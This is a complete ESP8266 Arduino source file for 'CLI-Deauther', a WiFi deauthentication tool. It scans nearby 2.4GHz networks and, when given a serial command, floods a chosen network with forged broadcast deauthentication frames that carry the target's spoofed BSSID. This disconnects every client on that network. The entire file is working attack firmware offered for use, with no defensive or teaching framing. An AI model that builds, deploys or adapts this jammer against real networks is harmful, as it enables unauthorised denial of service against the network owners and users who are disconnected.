/*
 * CLI-Deauther
 * A tool that deauthenticates 2.4GHz WiFi networks over a serial console.
 * Author - WireBits 
 */

#include <ESP8266WiFi.h>

struct WiFiNetwork {
    String ssid;
    uint8_t bssid[6];
    int channel;
    int rssi;
};

WiFiNetwork scannedNetworks[50];
int networkCount = 0;
bool scanning = false;
bool deauthRunning = false;
bool scanExecuted = false;
bool deauthExecuted = false;
uint8_t targetBSSID[6];
int targetChannel = 1;

const int ledPin = 2;
unsigned long previousMillis = 0;
const long blinkInterval = 50;
bool ledState = LOW;

const uint8_t deauthPacket[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x07, 0x00
};

void startWiFiScan() {
    Serial.println("[*] Scanning for networks...");
    scanning = true;
    scanExecuted = true;
    WiFi.scanNetworks(true);
}

void showScannedNetworks() {
    networkCount = WiFi.scanComplete();
    if (networkCount == 0) {
        Serial.println("[!] No networks found!");
        return;
    }
    Serial.println("\n[*] Scanned WiFi Networks:");
    Serial.println("-------------------------------------------------");
    for (int i = 0; i < networkCount; i++) {
        scannedNetworks[i].ssid = WiFi.SSID(i);
        memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
        scannedNetworks[i].channel = WiFi.channel(i);
        scannedNetworks[i].rssi = WiFi.RSSI(i);

        Serial.printf("[%02d] - SSID    : %s\n", i, scannedNetworks[i].ssid.c_str());
        Serial.printf("       BSSID   : %02X:%02X:%02X:%02X:%02X:%02X\n",
                      scannedNetworks[i].bssid[0], scannedNetworks[i].bssid[1], 
                      scannedNetworks[i].bssid[2], scannedNetworks[i].bssid[3], 
                      scannedNetworks[i].bssid[4], scannedNetworks[i].bssid[5]);
        Serial.printf("       Channel : %d\n", scannedNetworks[i].channel);
        Serial.printf("       RSSI    : %d dBm\n", scannedNetworks[i].rssi);
        Serial.println("-------------------------------------------------");
    }
}

void startDeauth(int index) {
    if (index < 0 || index >= networkCount) {
        Serial.println("[!] Invalid index!");
        return;
    }
    memcpy(targetBSSID, scannedNetworks[index].bssid, 6);
    targetChannel = scannedNetworks[index].channel;
    Serial.printf("[*] Deauth Attack Started on %s (Channel: %d)\n", scannedNetworks[index].ssid.c_str(), targetChannel);
    WiFi.disconnect();
    wifi_promiscuous_enable(1);
    wifi_set_channel(targetChannel);
    deauthRunning = true;
    deauthExecuted = true;
}

void stopDeauth() {
    deauthRunning = false;
    wifi_promiscuous_enable(0);
    WiFi.mode(WIFI_STA);
    digitalWrite(ledPin, HIGH);
    Serial.println("[*] Deauth Attack Stopped!");
}

void sendDeauth() {
    uint8_t packet[26];
    memcpy(packet, deauthPacket, 26);
    memcpy(&packet[10], targetBSSID, 6);
    memcpy(&packet[16], targetBSSID, 6);
    wifi_send_pkt_freedom(packet, 26, 0);
}

void showHelp() {
    Serial.println("\nAvailable Commands:");
    Serial.println("  scan        - Scan for nearby WiFi networks");
    Serial.println("  deauth X    - Start deauth attack on network X (X = Index Number)");
    Serial.println("  deauth off  - Stop deauth attack");
    Serial.println("  help        - Show this help message\n");
}

void blinkLED() {
    unsigned long currentMillis = millis();
    if (currentMillis - previousMillis >= blinkInterval) {
        previousMillis = currentMillis;
        ledState = !ledState;
        digitalWrite(ledPin, ledState ? LOW : HIGH);
    }
}

void setup() {
    Serial.begin(115200);
    pinMode(ledPin, OUTPUT);
    digitalWrite(ledPin, HIGH);
    WiFi.mode(WIFI_STA);
}

void loop() {
    if (Serial.available()) {
        String command = Serial.readStringUntil('\n');
        command.trim();

        if (command.equalsIgnoreCase("scan")) {
            startWiFiScan();
        }
        else if (command.startsWith("deauth ")) {
            String arg = command.substring(7);
            arg.trim();
            if (arg.equalsIgnoreCase("off")) {
                if (!deauthExecuted) {
                    Serial.println("[!] Deauth Network First!");
                } else {
                    stopDeauth();
                }
            } else {
                int index = arg.toInt();
                startDeauth(index);
            }
        }
        else if (command.equalsIgnoreCase("help")) {
            showHelp();
        }
        else {
            Serial.println("[!] Invalid command. Type 'help' for available commands.");
        }
    }
    if (scanning) {
        int found = WiFi.scanComplete();
        if (found >= 0) {
            showScannedNetworks();
            scanning = false;
            Serial.println("[*] Scanning Completed!");
        }
    }
    if (deauthRunning) {
        sendDeauth();
        blinkLED();
    }
}
